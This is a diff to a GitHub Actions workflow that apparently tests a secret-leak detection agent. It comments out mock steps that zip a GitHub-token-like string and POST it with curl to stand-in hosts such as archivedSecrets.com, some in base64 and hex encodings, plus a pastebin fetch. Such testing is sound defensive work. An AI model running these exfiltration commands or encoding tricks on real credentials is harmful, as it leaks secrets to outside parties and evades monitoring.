@@ -24,7 +24,7 @@ jobs:
           api_url: ${{ env.IR_API_URL }}
           app_token: ${{ env.IR_APP_TOKEN }}
           ir_debug: true
-          mode: docker-intercept
+          # mode: docker-intercept
       - name: Checkout repository
         uses: actions/checkout@v4
 
@@ -33,65 +33,65 @@ jobs:
         with:
          node-version: "22.11.0"
 
-      - name: 📝 Create and Compress the File
-        run: |
-          # 1. Create a dummy file for the mock
-          echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
+      # - name: 📝 Create and Compress the File
+      #   run: |
+      #     # 1. Create a dummy file for the mock
+      #     echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
           
-          # 2. Create the leaks.zip file in the working directory
-          zip leaks.zip dummy_file.txt
-      - name: 📝 Create and Compress the File With base64 secrets
-        run: |
-          # 1. Create a dummy file for the mock
-          echo "-d '{"data":{"GH":"Hello World"}}'" > dummy_file_64.txt
+      #     # 2. Create the leaks.zip file in the working directory
+      #     zip leaks.zip dummy_file.txt
+      # - name: 📝 Create and Compress the File With base64 secrets
+      #   run: |
+      #     # 1. Create a dummy file for the mock
+      #     echo "-d '{"data":{"GH":"Hello World"}}'" > dummy_file_64.txt
           
-          # 2. Create the leaks.zip file in the working directory
-          zip leaks64.zip dummy_file_64.txt
+      #     # 2. Create the leaks.zip file in the working directory
+      #     zip leaks64.zip dummy_file_64.txt
 
-      - name: 🚀 Upload the generated Zip File
-        run: |
-          # Since the 'zip' command ran in the root directory, 
-          # the path is simply 'leaks.zip'
-          curl -X POST https://archivedSecrets.com \
-            -F "file=@leaks.zip" \
-            -H "Content-Type: application/form-data"
+      # - name: 🚀 Upload the generated Zip File
+      #   run: |
+      #     # Since the 'zip' command ran in the root directory, 
+      #     # the path is simply 'leaks.zip'
+      #     curl -X POST https://archivedSecrets.com \
+      #       -F "file=@leaks.zip" \
+      #       -H "Content-Type: application/form-data"
             
-      - name: 🚀 Upload the generated Zip File base64 (x1000)
-        run: |
-          # Loop 1000 times
-          for i in {1..4}; do
-            echo "Executing request #$i..."
-            curl -X POST https://archivedSecretsbase64.com \
-              -F "file=@leaks64.zip" \
-              -H "Content-Type: application/form-data"
-          done
+      # - name: 🚀 Upload the generated Zip File base64 (x1000)
+      #   run: |
+      #     # Loop 1000 times
+      #     for i in {1..4}; do
+      #       echo "Executing request #$i..."
+      #       curl -X POST https://archivedSecretsbase64.com \
+      #         -F "file=@leaks64.zip" \
+      #         -H "Content-Type: application/form-data"
+      #     done
             
-      - name: Mock API key exposure request
-        run: |
-          curl -X POST https://normalsecrets.com \
-          -H "Content-Type: application/json" \
-          -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
-      - name: 3 level base64 encoding secrets
-        run: |
-          curl -X POST https://base64encodedsecrets.com \
-          -H "Content-Type: application/json" \
-          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
+      # - name: Mock API key exposure request
+      #   run: |
+      #     curl -X POST https://normalsecrets.com \
+      #     -H "Content-Type: application/json" \
+      #     -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
+      # - name: 3 level base64 encoding secrets
+      #   run: |
+      #     curl -X POST https://base64encodedsecrets.com \
+      #     -H "Content-Type: application/json" \
+      #     -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
 
-      - name: hex encoded
-        run: |
-          curl -X POST https://hexencodedsecrets.com \
-          -H "Content-Type: application/json" \
-          -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
+      # - name: hex encoded
+      #   run: |
+      #     curl -X POST https://hexencodedsecrets.com \
+      #     -H "Content-Type: application/json" \
+      #     -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
 
-      - name: non web request body
-        run: |
-          curl -X POST https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar \
-          -H "Content-Type: application/json" \
-          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
+      # - name: non web request body
+      #   run: |
+      #     curl -X POST https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar \
+      #     -H "Content-Type: application/json" \
+      #     -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
           
-      - name: secrets on response
-        run: |
-          curl -k https://pastebin.com/raw/V4FrgKcm
+      # - name: secrets on response
+      #   run: |
+      #     curl -k https://pastebin.com/raw/V4FrgKcm
       
       # - name: install dependencies
       #   run: npm install --legacy-peer-deps
